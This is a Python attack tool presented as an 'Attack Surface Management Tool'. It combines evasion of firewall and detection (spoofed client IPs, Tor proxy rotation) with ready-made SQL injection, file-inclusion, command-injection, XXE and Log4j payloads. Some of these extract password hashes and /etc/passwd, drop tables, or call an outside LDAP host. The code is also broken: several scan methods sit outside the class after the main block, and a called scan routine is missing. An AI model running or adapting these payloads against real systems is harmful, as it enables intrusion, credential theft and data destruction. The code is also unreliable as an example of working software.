#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Attack Surface Management Tool
Developed by: SayerLinux
Email: SaudiLinux1@gmail.com
"""

import requests
import json
import time
import random
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class AttackSurfaceManager:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.vulnerabilities = []
        self.exploited_vulns = []
        self.extracted_data = []
        self.log_function = None  # For web interface logging

    def log(self, message):
        """Log message to console and web interface if available"""
        print(message)
        if self.log_function:
            self.log_function(message)
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        ]
        self.headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
    def bypass_firewall(self):
        """تنفيذ تقنيات متقدمة لتجاوز جدار الحماية والتخفي أثناء الفحص"""
        
        # قائمة واسعة من وكلاء المستخدمين لتجنب الكشف
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
        ]
        
        # رؤوس HTTP متقدمة للتخفي
        self.advanced_headers = [
            {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': random.choice(['en-US,en;q=0.9', 'ar-SA,ar;q=0.9,en;q=0.8', 'fr-FR,fr;q=0.9,en;q=0.8']),
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Cache-Control': random.choice(['no-cache', 'max-age=0', 'private']),
                'DNT': '1',
                'X-Forwarded-For': self.generate_random_ip(),
                'X-Real-IP': self.generate_random_ip(),
                'X-Client-IP': self.generate_random_ip()
            },
            {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': self.target_url,
                'Referer': f"{self.target_url}/",
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin'
            }
        ]
        
        # قائمة وكلاء SOCKS وHTTP للدوران
        self.proxies = [
            {'http': 'socks5://127.0.0.1:9050', 'https': 'socks5://127.0.0.1:9050'},
            {'http': 'socks4://127.0.0.1:9050', 'https': 'socks4://127.0.0.1:9050'},
            {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
        ]
        
        # تطبيق تقنيات التخفي
        self.implement_stealth_techniques()
        
        return "✅ تم تطبيق تقنيات التخفي وتجاوز جدار الحماية بنجاح"
    
    def generate_random_ip(self):
        """توليد عنوان IP عشوائي للتخفي"""
        import random
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    def implement_stealth_techniques(self):
        """تطبيق تقنيات التخفي المتقدمة"""
        
        # 1. تغيير هوية الجلسة بشكل دوري
        self.session.cookies.clear()
        
        # 2. استخدام تأخيرات عشوائية بين الطلبات
        self.delays = [0.5, 1.0, 1.5, 2.0, 2.5, 3.0, 4.0, 5.0]
        
        # 3. تدوير رؤوس HTTP
        self.headers = random.choice(self.advanced_headers)
        
        # 4. تمكين ضغط البيانات
        self.session.headers.update({
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive'
        })
        
        # 5. تكوين الجلسة للتعامل مع إعادة التوجيه بشكل طبيعي
        self.session.max_redirects = 5
        
        # 6. تعطيل التحقق من الشهادات SSL (للفحص فقط)
        self.session.verify = False
        
        # 7. تكوين المهلة الزمنية للطلبات
        self.timeout = random.choice([10, 15, 20, 25, 30])
        
        print("🎭 تم تطبيق تقنيات التخفي:")
        print("   - تدوير وكلاء المستخدمين")
        print("   - توليد عناوين IP مزيفة")
        print("   - تعديل رؤوس HTTP")
        print("   - استخدام تأخيرات عشوائية")
        print("   - تمكين ضغط البيانات")
    
    def stealth_request(self, method, url, **kwargs):
        """تنفيذ طلب HTTP مع تقنيات التخفي"""
        
        # تطبيق تأخير عشوائي
        delay = random.choice(self.delays)
        time.sleep(delay)
        
        # تدوير الرؤوس كل عدة طلبات
        if random.randint(1, 5) == 1:
            self.headers = random.choice(self.advanced_headers)
        
        # استخدام وكيل عشوائي (إذا كان متاحاً)
        if random.randint(1, 3) == 1 and self.proxies:
            proxy = random.choice(self.proxies)
            kwargs['proxies'] = proxy
        
        # تحديث رؤوس الطلب
        kwargs['headers'] = self.headers
        kwargs['timeout'] = self.timeout
        
        try:
            if method.upper() == 'GET':
                response = self.session.get(url, **kwargs)
            elif method.upper() == 'POST':
                response = self.session.post(url, **kwargs)
            else:
                response = self.session.request(method, url, **kwargs)
            
            print(f"🕵️  {method.upper()} {url} - Status: {response.status_code} - Delay: {delay}s")
            return response
            
        except Exception as e:
            print(f"❌ فشل الطلب إلى {url}: {str(e)}")
            return None
    
    def discover_endpoints(self):
        """اكتشاف النقاط الطرفية المخفية مع تقنيات التخفي"""
        endpoints = []
        
        # قوائم متقدمة للمسارات المخفية
        common_paths = [
            'admin', 'admin.php', 'administrator', 'login', 'login.php', 'wp-admin',
            'api', 'api/v1', 'api/v2', 'graphql', 'rest', 'swagger', 'docs',
            'config', 'backup', 'test', 'dev', 'staging', 'uploads', 'files',
            '.git', '.env', 'robots.txt', 'sitemap.xml', 'phpmyadmin', 'mysql',
            'console', 'debug', 'info', 'status', 'health', 'metrics',
            '_config', '_admin', '_private', '_backup', '_test',
            'wp-content', 'wp-includes', 'wp-json', 'xmlrpc.php',
            'install', 'setup', 'configuration', 'settings',
            'temp', 'tmp', 'cache', 'logs', 'log',
            'api-docs', 'swagger-ui', 'redoc', 'openapi.json',
            '.htaccess', '.htpasswd', '.svn', '.hg', '.bzr',
            'composer.json', 'package.json', 'requirements.txt',
            'docker-compose.yml', 'Dockerfile', 'Vagrantfile',
            'web.config', 'config.php', 'settings.php', 'config.inc.php'
        ]
        
        # تقنيات التخفي أثناء الاكتشاف
        for path in common_paths:
            url = f"{self.target_url.rstrip('/')}/{path}"
            
            # استخدام طرق طلب متعددة
            methods = ['GET', 'HEAD', 'OPTIONS']
            
            for method in methods:
                try:
                    # استخدام طلب التخفي
                    response = self.stealth_request(method, url, allow_redirects=False)
                    
                    if response and response.status_code in [200, 403, 401, 301, 302]:
                        endpoint_info = {
                            'path': path,
                            'method': method,
                            'status_code': response.status_code,
                            'url': url,
                            'headers': dict(response.headers),
                            'discovered_at': datetime.now().isoformat()
                        }
                        
                        # استخراج معلومات إضافية من الرؤوس
                        if 'Server' in response.headers:
                            endpoint_info['server'] = response.headers['Server']
                        if 'X-Powered-By' in response.headers:
                            endpoint_info['technology'] = response.headers['X-Powered-By']
                        
                        endpoints.append(endpoint_info)
                        break  # لا حاجة لاختبار الطرق الأخرى إذا تم العثور على النقطة
                        
                except Exception as e:
                    print(f"⚠️  فشل اكتشاف {url} بالطريقة {method}: {str(e)}")
                    continue
        
        # اكتشاف النقاط الطرفية باستخدام تقنيات متقدمة
        endpoints.extend(self.discover_advanced_endpoints())
        
        # إزالة التكرارات
        unique_endpoints = []
        seen_paths = set()
        for endpoint in endpoints:
            if endpoint['path'] not in seen_paths:
                unique_endpoints.append(endpoint)
                seen_paths.add(endpoint['path'])
        
        print(f"🔍 تم اكتشاف {len(unique_endpoints)} نقطة طرفية مخفية")
        return unique_endpoints
    
    def discover_advanced_endpoints(self):
        """اكتشاف نقاط طرفية متقدمة باستخدام تقنيات التخفي"""
        endpoints = []
        
        # تقنيات الاكتشاف المتقدمة
        techniques = [
            self.discover_api_endpoints,
            self.discover_subdomain_takeover,
            self.discover_backup_files,
            self.discover_virtual_hosts
        ]
        
        for technique in techniques:
            try:
                results = technique()
                endpoints.extend(results)
            except Exception as e:
                print(f"⚠️  فشل تقنية الاكتشاف المتقدمة: {str(e)}")
                continue
        
        return endpoints
    
    def discover_api_endpoints(self):
        """اكتشاف نقاط واجهات برمجة التطبيقات المخفية"""
        api_endpoints = []
        
        # مسارات واجهات برمجة التطبيقات الشائعة
        api_paths = [
            'api', 'api/v1', 'api/v2', 'api/v3',
            'rest', 'rest/v1', 'rest/v2',
            'graphql', 'gql',
            'api-docs', 'swagger', 'openapi',
            'services', 'endpoints', 'methods'
        ]
        
        for path in api_paths:
            url = f"{self.target_url.rstrip('/')}/{path}"
            
            # اختبار طرق واجهات برمجة التطبيقات المختلفة
            api_methods = ['GET', 'POST', 'OPTIONS', 'HEAD']
            
            for method in api_methods:
                try:
                    response = self.stealth_request(method, url)
                    
                    if response and response.status_code == 200:
                        # فحص ما إذا كانت هذه واجهة تطبيقات
                        content_type = response.headers.get('Content-Type', '')
                        
                        if any(api_indicator in content_type.lower() for api_indicator in ['json', 'xml', 'graphql']):
                            api_endpoints.append({
                                'path': path,
                                'method': method,
                                'type': 'API Endpoint',
                                'status_code': response.status_code,
                                'content_type': content_type,
                                'url': url
                            })
                            
                except Exception as e:
                    continue
        
        return api_endpoints
    
    def discover_backup_files(self):
        """اكتشاف الملفات الاحتياطية المخفية"""
        backup_endpoints = []
        
        # امتدادات الملفات الاحتياطية
        backup_extensions = ['.bak', '.backup', '.old', '.orig', '.save', '.copy', '.tmp']
        
        # الملفات الحساسة التي قد تكون موجودة كنسخ احتياطية
        sensitive_files = ['index', 'config', 'database', 'wp-config', 'settings', 'admin']
        
        for file_name in sensitive_files:
            for ext in backup_extensions:
                backup_file = f"{file_name}{ext}"
                url = f"{self.target_url.rstrip('/')}/{backup_file}"
                
                try:
                    response = self.stealth_request('GET', url)
                    
                    if response and response.status_code == 200:
                        backup_endpoints.append({
                            'path': backup_file,
                            'type': 'Backup File',
                            'status_code': response.status_code,
                            'url': url,
                            'size': len(response.content) if hasattr(response, 'content') else 0
                        })
                        
                except Exception as e:
                    continue
        
        return backup_endpoints
    
    def discover_subdomain_takeover(self):
        """البحث عن نقاط الاستيلاء على النطاقات الفرعية"""
        takeover_endpoints = []
        
        # سجلات CNAME شائعة للاستيلاء
        takeover_services = [
            'github.io', 'herokuapp.com', 'azurewebsites.net',
            's3.amazonaws.com', 'cloudfront.net', 'elasticbeanstalk.com'
        ]
        
        # هذا مثال مبسط - في الواقع يتطلب فحص DNS
        for service in takeover_services:
            subdomain = f"test.{self.target_url.split('//')[1]}"
            url = f"http://{subdomain}"
            
            try:
                response = self.stealth_request('GET', url, timeout=5)
                
                if response and response.status_code in [404, 403]:
                    takeover_endpoints.append({
                        'path': subdomain,
                        'type': 'Potential Subdomain Takeover',
                        'service': service,
                        'status_code': response.status_code,
                        'url': url
                    })
                    
            except Exception as e:
                continue
        
        return takeover_endpoints
    
    def discover_virtual_hosts(self):
        """اكتشاف المضيفين الافتراضيين المخفيين"""
        vhost_endpoints = []
        
        # أسماء مضيفين افتراضيين شائعة
        vhost_names = [
            'admin', 'api', 'dev', 'test', 'staging', 'beta',
            'www', 'mail', 'ftp', 'localhost', 'internal'
        ]
        
        for vhost in vhost_names:
            headers = {'Host': f"{vhost}.{self.target_url.split('//')[1]}"}
            
            try:
                response = self.stealth_request('GET', self.target_url, headers=headers)
                
                if response and response.status_code == 200:
                    vhost_endpoints.append({
                        'path': vhost,
                        'type': 'Virtual Host',
                        'vhost': f"{vhost}.{self.target_url.split('//')[1]}",
                        'status_code': response.status_code,
                        'url': self.target_url
                    })
                    
            except Exception as e:
                continue
        
        return vhost_endpoints
    
    def scan_sql_injection(self, url, params=None):
        """فحص ثغرات حقن SQL مع تقنيات التخفي المتقدمة"""
        vulns = []
        
        # حمولات حقن SQL متقدمة
        sqli_payloads = [
            "'", 
            "' OR '1'='1", 
            "' OR 1=1--", 
            "'; DROP TABLE users; --", 
            "' UNION SELECT NULL--",
            "' AND 1=1--",
            "' AND 1=2--",
            "' OR 'a'='a'--",
            "' OR SLEEP(5)--",
            "' OR pg_sleep(5)--",
            "' OR WAITFOR DELAY '0:0:5'--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT null,null,null--",
            "' UNION SELECT @@version,database(),user()--",
            "' UNION SELECT table_name,column_name FROM information_schema.columns--"
        ]
        
        # رسائل أخطاء قواعد البيانات المختلفة
        error_patterns = {
            'mysql': ['mysql_fetch_array', 'mysql_num_rows', 'mysql_error', 'You have an error in your SQL syntax'],
            'postgresql': ['pg_query', 'pg_fetch_array', 'PostgreSQL query failed', 'Warning: pg_'],
            'oracle': ['ORA-', 'Oracle error', 'Oracle driver', 'oci_parse'],
            'mssql': ['Microsoft OLE DB Provider', 'ODBC SQL Server Driver', 'SQL Server', 'Unclosed quotation mark'],
            'sqlite': ['SQLite error', 'sqlite3', 'SQLite3::query']
        }
        
        for payload in sqli_payloads:
            if params:
                for param in params:
                    test_params = {param: payload}
                    
                    try:
                        # استخدام طلب التخفي بدلاً من الطلب المباشر
                        response = self.stealth_request('GET', url, params=test_params)
                        
                        if response and response.status_code == 200:
                            response_text = response.text.lower()
                            
                            # فحص أنماط الأخطاء المختلفة
                            detected_db = None
                            for db_type, patterns in error_patterns.items():
                                if any(pattern.lower() in response_text for pattern in patterns):
                                    detected_db = db_type
                                    break
                            
                            # فحص السلوك المختلف للتطبيق
                            if detected_db or self.is_sql_vulnerable(response, payload):
                                vuln_info = {
                                    'type': 'SQL Injection',
                                    'severity': 'Critical',
                                    'parameter': param,
                                    'payload': payload,
                                    'database': detected_db or 'Unknown',
                                    'proof': f"Database error detected: {detected_db}" if detected_db else "Application behavior indicates SQL injection",
                                    'url': url,
                                    'response_length': len(response.text),
                                    'status_code': response.status_code,
                                    'detected_at': datetime.now().isoformat()
                                }
                                
                                vulns.append(vuln_info)
                                print(f"🚨 تم اكتشاف ثغرة حقن SQL: {param} = {payload}")
                                
                                # محاولة استخراج معلومات إضافية
                                if detected_db:
                                    self.extract_database_info(url, param, detected_db)
                                
                    except Exception as e:
                        print(f"⚠️  فشل فحص SQL للمعامل {param}: {str(e)}")
                        continue
        
        return vulns
    
    def is_sql_vulnerable(self, response, payload):
        """التحقق مما إذا كان الاستجابة تشير إلى وجود ثغرة SQL"""
        
        # قائمة بالكلمات المفتاحية التي تشير إلى أخطاء SQL
        sql_error_keywords = [
            'sql', 'query', 'database', 'mysql', 'postgresql', 'oracle',
            'syntax error', 'warning', 'fatal error', 'exception'
        ]
        
        response_text = response.text.lower()
        
        # فحص وجود كلمات مفتاحية لأخطاء SQL
        if any(keyword in response_text for keyword in sql_error_keywords):
            return True
        
        # فحص تغير طول الاستجابة بشكل كبير
        if len(response.text) > 1000 and "error" in response_text:
            return True
        
        # فحص وجود رسائل خطأ تقنية
        if any(error_type in response_text for error_type in ['warning', 'error', 'exception', 'fatal']):
            return True
        
        return False
    
    def extract_database_info(self, url, param, db_type):
        """محاولة استخراج معلومات من قاعدة البيانات"""
        
        extraction_payloads = {
            'mysql': [
                "' UNION SELECT database(), user(), version()--",
                "' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database()--",
                "' UNION SELECT username, password FROM users--"
            ],
            'postgresql': [
                "' UNION SELECT current_database(), current_user, version()--",
                "' UNION SELECT table_name, column_name FROM information_schema.columns--",
                "' UNION SELECT usename, passwd FROM pg_shadow--"
            ],
            'mssql': [
                "' UNION SELECT db_name(), user_name(), @@version--",
                "' UNION SELECT name, type_desc FROM sys.tables--",
                "' UNION SELECT name, password_hash FROM sys.sql_logins--"
            ]
        }
        
        if db_type in extraction_payloads:
            print(f"🔍 محاولة استخراج معلومات من قاعدة البيانات {db_type}...")
            
            for payload in extraction_payloads[db_type]:
                try:
                    test_params = {param: payload}
                    response = self.stealth_request('GET', url, params=test_params)
                    
                    if response and len(response.text) > 500:
                        print(f"✅ تم استخراج معلومات من قاعدة البيانات باستخدام: {payload}")
                        return response.text[:1000]
                        
                except Exception as e:
                    continue
        
        return None
    
    def exploit_vulnerability(self, vuln):
        """Exploit discovered vulnerabilities"""
        exploit_result = {
            'vulnerability': vuln,
            'exploitation_successful': False,
            'extracted_data': None,
            'proof': None
        }
        
        try:
            if vuln['type'] == 'SQL Injection':
                # Attempt to extract database information
                sqli_payloads = [
                    "' UNION SELECT database(), user(), version()--",
                    "' UNION SELECT table_name, column_name, NULL FROM information_schema.columns--",
                    "' UNION SELECT username, password, NULL FROM users--"
                ]
                
                for payload in sqli_payloads:
                    test_params = {vuln.get('parameter', 'id'): payload}
                    response = self.session.get(vuln['url'], params=test_params, headers=self.headers, verify=False, timeout=15)
                    if len(response.text) > 500 and 'error' not in response.text.lower():
                        exploit_result['exploitation_successful'] = True
                        exploit_result['extracted_data'] = response.text[:1000]
                        exploit_result['proof'] = "Database information extracted successfully"
                        break
            
            elif vuln['type'] == 'Local File Inclusion (LFI)':
                # Attempt to read sensitive files
                lfi_payloads = [
                    '../../../etc/passwd',
                    '..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts',
                    'php://filter/convert.base64-encode/resource=index.php'
                ]
                
                for payload in lfi_payloads:
                    test_params = {vuln.get('parameter', 'file'): payload}
                    response = self.session.get(vuln['url'], params=test_params, headers=self.headers, verify=False, timeout=15)
                    if 'root:' in response.text or 'localhost' in response.text or 'PD9' in response.text:
                        exploit_result['exploitation_successful'] = True
                        exploit_result['extracted_data'] = response.text[:1000]
                        exploit_result['proof'] = "Sensitive files accessed successfully"
                        break
            
            elif vuln['type'] == 'Remote Code Execution (RCE)':
                # Attempt to execute system commands
                rce_payloads = [
                    '; echo "RCE_SUCCESS"',
                    '| echo "RCE_SUCCESS"',
                    '`echo "RCE_SUCCESS"`'
                ]
                
                for payload in rce_payloads:
                    test_params = {vuln.get('parameter', 'cmd'): payload}
                    response = self.session.get(vuln['url'], params=test_params, headers=self.headers, verify=False, timeout=20)
                    if 'RCE_SUCCESS' in response.text:
                        exploit_result['exploitation_successful'] = True
                        exploit_result['extracted_data'] = "Command execution confirmed"
                        exploit_result['proof'] = "Remote code execution successful"
                        break
            
            elif vuln['type'] == 'XML External Entity (XXE)':
                # Attempt to read system files
                xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
                <root>&xxe;</root>'''
                
                headers = self.headers.copy()
                headers['Content-Type'] = 'application/xml'
                
                response = self.session.post(vuln['url'], data=xxe_payload, headers=headers, verify=False, timeout=15)
                if 'root:' in response.text:
                    exploit_result['exploitation_successful'] = True
                    exploit_result['extracted_data'] = response.text[:1000]
                    exploit_result['proof'] = "System file accessed via XXE"
        
        except Exception as e:
            exploit_result['proof'] = f"Exploitation failed: {str(e)}"
        
        return exploit_result
    
    def extract_sensitive_data(self, url):
        """Extract sensitive data from the target"""
        extracted_data = []
        
        # Extract email addresses
        try:
            response = self.session.get(url, headers=self.headers, verify=False, timeout=10)
            emails = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', response.text)
            if emails:
                extracted_data.extend([{'type': 'Email Address', 'data': email} for email in emails[:10]])
        except:
            pass
        
        # Extract API keys
        api_keys = re.findall(r'["\'](?:api[_-]?key|apikey|api_secret)["\']\s*:\s*["\']([a-zA-Z0-9_-]{20,})["\']', response.text)
        if api_keys:
            extracted_data.extend([{'type': 'API Key', 'data': key} for key in api_keys[:5]])
        
        # Extract database connection strings
        db_patterns = [
            r'mysql://[^:]+:[^@]+@[^/]+/\w+',
            r'postgresql://[^:]+:[^@]+@[^/]+/\w+',
            r'mongodb://[^:]+:[^@]+@[^/]+/\w+'
        ]
        
        for pattern in db_patterns:
            matches = re.findall(pattern, response.text)
            if matches:
                extracted_data.extend([{'type': 'Database Connection', 'data': match} for match in matches[:3]])
        
        # Extract hidden forms and endpoints
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        if forms:
            for form in forms[:5]:
                form_info = {
                    'action': form.get('action', 'No action'),
                    'method': form.get('method', 'get'),
                    'inputs': [input_field.get('name', 'unnamed') for input_field in form.find_all('input')[:5]]
                }
                extracted_data.append({'type': 'Hidden Form', 'data': str(form_info)})
        
        return extracted_data
    
    def generate_report(self):
        """Generate comprehensive security report"""
        report = {
            'scan_info': {
                'target': self.target_url,
                'scan_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'tool_version': '1.0.0',
                'developer': 'SayerLinux',
                'contact': 'SaudiLinux1@gmail.com'
            },
            'summary': {
                'total_vulnerabilities': len(self.vulnerabilities),
                'critical': len([v for v in self.vulnerabilities if v['severity'] == 'Critical']),
                'high': len([v for v in self.vulnerabilities if v['severity'] == 'High']),
                'medium': len([v for v in self.vulnerabilities if v['severity'] == 'Medium']),
                'low': len([v for v in self.vulnerabilities if v['severity'] == 'Low']),
                'exploited_vulnerabilities': len(self.exploited_vulns),
                'data_extracted': len(self.extracted_data)
            },
            'vulnerabilities': self.vulnerabilities,
            'exploitation_results': self.exploited_vulns,
            'extracted_data': self.extracted_data,
            'firewall_bypass_status': self.bypass_firewall()
        }
        
        return report

# Main function for command-line usage
def main():
    import sys
    import argparse
    
    parser = argparse.ArgumentParser(description='Attack Surface Management Tool')
    parser.add_argument('target_url', nargs='?', help='Target URL to scan (e.g., https://example.com)')
    
    args = parser.parse_args()
    
    if not args.target_url:
        parser.print_help()
        sys.exit(1)
    
    target_url = args.target_url
    
    # Validate URL
    if not target_url.startswith(('http://', 'https://')):
        print("Error: URL must start with http:// or https://")
        sys.exit(1)
    
    print("=" * 60)
    print("Attack Surface Management Tool")
    print("Developed by: SayerLinux")
    print("Email: SaudiLinux1@gmail.com")
    print("=" * 60)
    
    try:
        scanner = AttackSurfaceManager(target_url)
        report = scanner.run_comprehensive_scan()
        
        print("\n" + "=" * 60)
        print("فحص مكتمل!")
        print(f"تم اكتشاف {len(report['vulnerabilities'])} ثغرة أمنية")
        print(f"تم استغلال {len(report['exploitation_results'])} ثغرة")
        print(f"تم استخراج {len(report['extracted_data'])} عنصر من البيانات")
        print("=" * 60)
        
    except KeyboardInterrupt:
        print("\n[!] تم إيقاف الفحص بواسطة المستخدم")
        sys.exit(0)
    except Exception as e:
        print(f"Error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()
    
    def scan_rce(self, url, params=None):
        """Scan for Remote Code Execution vulnerabilities"""
        vulns = []
        rce_payloads = ['; cat /etc/passwd', '| whoami', '`whoami`', '$(whoami)']
        
        for payload in rce_payloads:
            if params:
                for param in params:
                    test_params = {param: payload}
                    try:
                        response = self.session.get(url, params=test_params, headers=self.headers, verify=False, timeout=20)
                        if any(indicator in response.text.lower() for indicator in ['root', 'administrator', 'www-data']):
                            vulns.append({
                                'type': 'Remote Code Execution (RCE)',
                                'severity': 'Critical',
                                'parameter': param,
                                'payload': payload,
                                'proof': f"System user detected in response",
                                'url': url
                            })
                    except:
                        continue
        return vulns
    
    def scan_lfi(self, url, params=None):
        """Scan for Local File Inclusion vulnerabilities"""
        vulns = []
        lfi_payloads = ['../../../etc/passwd', '..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts', '....//....//....//etc/passwd']
        
        for payload in lfi_payloads:
            if params:
                for param in params:
                    test_params = {param: payload}
                    try:
                        response = self.session.get(url, params=test_params, headers=self.headers, verify=False, timeout=15)
                        if any(indicator in response.text for indicator in ['root:', 'daemon:', 'windows']):
                            vulns.append({
                                'type': 'Local File Inclusion (LFI)',
                                'severity': 'High',
                                'parameter': param,
                                'payload': payload,
                                'proof': f"System file content detected in response",
                                'url': url
                            })
                    except:
                        continue
        return vulns
    
    def scan_idor(self, url):
        """Scan for Insecure Direct Object References"""
        vulns = []
        # Look for numeric IDs in URL
        numeric_ids = re.findall(r'(\d+)', url)
        idor_payloads = ['1', '2', '3', 'admin', 'root', '../admin', '../../config']
        
        for current_id in numeric_ids:
            for test_id in idor_payloads:
                test_url = url.replace(current_id, test_id)
                try:
                    response = self.session.get(test_url, headers=self.headers, verify=False, timeout=10)
                    if response.status_code == 200 and len(response.text) > 500:
                        vulns.append({
                            'type': 'Insecure Direct Object Reference (IDOR)',
                            'severity': 'Medium',
                            'original_id': current_id,
                            'test_id': test_id,
                            'proof': f"Different content accessed with modified ID",
                            'url': test_url
                        })
                except:
                    continue
        return vulns
    
    def scan_cors(self, url):
        """Scan for Cross-Origin Resource Sharing misconfigurations"""
        vulns = []
        cors_payloads = ['null', 'http://evil.com', 'https://malicious-site.com']
        
        for payload in cors_payloads:
            headers = self.headers.copy()
            headers['Origin'] = payload
            
            try:
                response = self.session.get(url, headers=headers, verify=False, timeout=10)
                cors_header = response.headers.get('Access-Control-Allow-Origin', '')
                if cors_header == payload or cors_header == '*':
                    vulns.append({
                        'type': 'CORS Misconfiguration',
                        'severity': 'Low',
                        'origin': payload,
                        'proof': f"CORS header allows origin: {cors_header}",
                        'url': url
                    })
            except:
                continue
        return vulns
    
    def scan_zero_day(self, url):
        """Simulate zero-day vulnerability scanning"""
        vulns = []
        zero_day_payloads = [
            {'payload': '${jndi:ldap://malicious-server.com/a}', 'type': 'Log4j (Zero-Day)'},
            {'payload': '%{${env:AWS_SECRET_ACCESS_KEY}}', 'type': 'EL Injection (Zero-Day)'},
            {'payload': '{{7*7}}', 'type': 'Template Injection (Zero-Day)'}
        ]
        
        for zero_day in zero_day_payloads:
            test_params = {'input': zero_day['payload'], 'search': zero_day['payload'], 'q': zero_day['payload']}
            try:
                response = self.session.get(url, params=test_params, headers=self.headers, verify=False, timeout=15)
                if any(indicator in response.text for indicator in ['49', 'AWS', '49']):
                    vulns.append({
                        'type': zero_day['type'],
                        'severity': 'Critical',
                        'payload': zero_day['payload'],
                        'proof': f"Zero-day payload executed successfully",
                        'url': url
                    })
            except:
                continue
        
        return vulns
    
    def scan_xss(self, url, forms=None):
        """Scan for Cross-Site Scripting (XSS) vulnerabilities"""
        vulns = []
        xss_payloads = ['<script>alert("XSS")</script>', '<img src=x onerror=alert("XSS")>', '<svg onload=alert("XSS")>']
        
        for payload in xss_payloads:
            try:
                test_url = f"{url}?q={payload}"
                response = self.session.get(test_url, headers=self.headers, verify=False, timeout=15)
                if payload in response.text:
                    vulns.append({
                        'type': 'Cross-Site Scripting (XSS)',
                        'severity': 'Medium',
                        'payload': payload,
                        'proof': f"Payload reflected in response",
                        'url': test_url
                    })
            except:
                continue
        return vulns
    
    def scan_xxe(self, url):
        """Scan for XML External Entity (XXE) vulnerabilities"""
        vulns = []
        xxe_payloads = ['<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>', '<!ENTITY % xxe SYSTEM "file:///etc/passwd">']
        
        for payload in xxe_payloads:
            xml_data = f'''<?xml version="1.0" encoding="UTF-8"?>
            {payload}
            <root>
                <test>test</test>
            </root>'''
            
            headers = self.headers.copy()
            headers['Content-Type'] = 'application/xml'
            
            try:
                response = self.session.post(url, data=xml_data, headers=headers, verify=False, timeout=15)
                if any(indicator in response.text for indicator in ['root:', 'daemon:', 'bin:']):
                    vulns.append({
                        'type': 'XML External Entity (XXE)',
                        'severity': 'High',
                        'payload': payload,
                        'proof': f"System file content detected in response",
                        'url': url
                    })
            except:
                continue
        return vulns